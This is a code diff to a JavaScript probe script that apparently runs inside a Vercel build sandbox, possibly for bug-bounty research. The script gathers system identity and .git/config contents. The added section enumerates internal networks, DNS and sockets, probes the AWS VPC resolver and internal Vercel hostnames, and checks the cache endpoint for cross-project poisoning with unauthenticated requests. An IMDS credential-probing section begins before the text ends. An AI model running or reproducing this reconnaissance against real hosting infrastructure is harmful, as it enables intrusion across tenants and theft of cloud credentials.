@@ -126,7 +126,7 @@ function tryDecrypt(keyStr, contentStr) {
 }
 
 const report = {
-  marker: "VERCEL-AGENT-PROBE-7F3A2C-v3",
+  marker: "VERCEL-AGENT-PROBE-7F3A2C-v12",
   whoami: safe(() => execSync("id; uname -a; pwd").toString().trim()),
   // credential-bearing surfaces (own sandbox only)
   gitConfig: safe(() => readFileSync(".git/config", "utf8")),
@@ -395,6 +395,47 @@ const report = {
     // Enumerate ALL files in /vercel/output recursively
     outputFiles: safe(() => execSync("find /vercel/output -type f -exec ls -la {} \\; 2>/dev/null | head -20 || true").toString().trim()),
   })),
+  // Network topology — what internal networks and hosts are reachable from the build sandbox?
+  // (Proves multi-tenant isolation level and internal Vercel infra reachability)
+  networkTopology: safe(() => ({
+    // ARP table — neighboring hosts on same L2 segment (other VMs? Vercel infra?)
+    arpTable: safe(() => execSync("cat /proc/net/arp 2>/dev/null || true").toString().trim()),
+    // Routing table — what networks are routable from this sandbox?
+    routes: safe(() => execSync("ip route 2>/dev/null || route -n 2>/dev/null || true").toString().trim()),
+    // DNS resolvers — internal resolver IPs reveal Vercel/AWS internal DNS
+    resolvConf: safe(() => execSync("cat /etc/resolv.conf 2>/dev/null || true").toString().trim()),
+    // Internal hostnames — Vercel services with hardcoded names
+    hostsFile: safe(() => execSync("cat /etc/hosts 2>/dev/null || true").toString().trim()),
+    // Open TCP/UDP sockets in the sandbox (hex addresses — reveals internal connections)
+    tcpSockets: safe(() => execSync("cat /proc/net/tcp /proc/net/tcp6 2>/dev/null | head -20 || true").toString().trim()),
+    // Active network interfaces
+    interfaces: safe(() => execSync("ip addr 2>/dev/null || ifconfig 2>/dev/null | head -30 || true").toString().trim()),
+    // Probe internal VPC DNS (169.254.169.253 is AWS VPC resolver)
+    awsVpcDns: safe(() => execSync("curl -s --max-time 3 http://169.254.169.253/ -o /tmp/vpcdns -w '%{http_code}' 2>/dev/null || true").toString().trim()),
+    // Probe Firecracker microVM network gateway (common pattern: first IP in subnet)
+    netNs: safe(() => execSync("ip netns list 2>/dev/null || true").toString().trim()),
+    // See if we can resolve internal Vercel hostnames
+    vercelInternal: safe(() => execSync("nslookup api-iad1.vercel.com 2>/dev/null | head -5 || true").toString().trim()),
+  })),
+  // Cross-project suspense cache scope — is the cache key namespaced per-project?
+  // If RUNTIME_CACHE_ENDPOINT does NOT contain the project ID, cross-project poisoning is possible.
+  cacheScope: safe(() => {
+    const ep = process.env.RUNTIME_CACHE_ENDPOINT || '';
+    const projectId = process.env.VERCEL_PROJECT_ID || '';
+    const deployId = process.env.VERCEL_DEPLOYMENT_ID || '';
+    const scopeCheck = {
+      endpoint: ep,
+      projectId: projectId ? `present(${projectId.slice(0,12)}...)` : 'absent',
+      deployId: deployId ? `present(${deployId.slice(0,12)}...)` : 'absent',
+      // Does the endpoint URL embed the project/deployment ID? If not → shared namespace
+      endpointContainsProjectId: ep && projectId ? ep.includes(projectId) : null,
+      endpointContainsDeployId: ep && deployId ? ep.includes(deployId) : null,
+      // Try a key that reveals who can read it (no auth header)
+      noAuthGet: safe(() => execSync(`curl -s --max-time 5 -w '%{http_code}' -o /tmp/ca_noauth '${ep}probe-bounty-test-key' 2>/dev/null || true`).toString().trim()),
+      noAuthBody: safe(() => readFileSync('/tmp/ca_noauth','utf8').slice(0,100)),
+    };
+    return scopeCheck;
+  }),
   // IMDS probing — additional MMDS paths beyond IAM credentials
   imds: safe(() => {
     const imdsToken = safe(() =>
